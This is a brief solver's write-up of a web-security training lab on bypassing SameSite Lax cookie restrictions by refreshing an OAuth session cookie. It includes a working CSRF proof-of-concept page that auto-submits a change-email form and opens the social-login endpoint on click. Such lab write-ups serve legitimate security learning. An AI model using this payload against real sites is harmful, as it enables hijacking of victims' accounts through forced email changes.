# Practitioner Lab 85: SameSite Lax bypass via cookie refresh

---

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials:Â `wiener:peter`

I added a script to initiate the sign in to reset the token and then quickly I would then do a csrf attack

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a4e0090038236ba821a572100ae000d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test4&#64;changedemail&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>

window.onclick = () => {
    window.open('https://0a4e0090038236ba821a572100ae000d.web-security-academy.net/social-login');
}

      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

After trying it on myself I then delivered this to the victim.

This then solved the lab.